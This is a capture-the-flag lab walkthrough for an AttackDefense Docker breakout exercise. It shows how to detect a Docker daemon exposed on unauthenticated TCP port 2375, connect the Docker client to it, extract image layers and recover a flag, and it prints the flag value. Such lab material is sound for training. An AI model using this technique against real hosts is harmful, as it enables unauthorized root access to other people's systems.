### Name : Misconfigured Docker Socket
### URL : https://attackdefense.com/challengedetails?cid=1194
### Type DevSecOps : Docker Breakouts  


  
**Important Note**: This document illustrates all the important steps required to complete this lab.
This is by no means a comprehensive step-by-step solution for this exercise. This is only
provided as a reference to various commands needed to complete this exercise and for your
further research on this topic. Also, note that the IP addresses and domain names might be
different in your lab.  

  
**Objective**: Leverage the unprotected TCP socket to escalate privileges and retrieve the flag
stored in the root directory of the host system!  

#### 1. List all processes listening on TCP ports of the local machine

```bash
sudo netstat  -nlptu
```
Conventionally Docker daemon is configured to listen on port 2375 for API requests sent over
unencrypted connections. Whereas 2376 is used for encrypted connections.

#### 2. Verify if the port 2375 is being used by the docker daemon.

```bash
curl localhost:2375/version
```
  
Output confirms that the Docker daemon is listening on TCP port 2375.  


#### 3. Docker client is installed on the host machine. Configure docker client to use the TCP Socket.  

```bash
export DOCKER_HOST="tcp://localhost:2375"
```

#### 4. Check the images available on local machine.

```
docker images
```

#### 5. Extract image

```
root@attackdefense:~# mkdir image
root@attackdefense:~# mv *.tar image
root@attackdefense:~# cd image/
root@attackdefense:~/image# for i in 1 2 3; do tar -xf $i.tar; done
root@attackdefense:~/image# ls
1.tar  2.tar  3.tar  bin  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@attackdefense:~/image#
```

#### 6. Find the flag

```
root@attackdefense:~/image# find . -name *flag* 2> /dev/null
./etc/network/if-post-up.d/flag.txt
root@attackdefense:~/image# cat etc/network/if-post-up.d/flag.txt
c09f6e2ecff56dcae50c02c6a4d355fe
root@attackdefense:~/image#
```
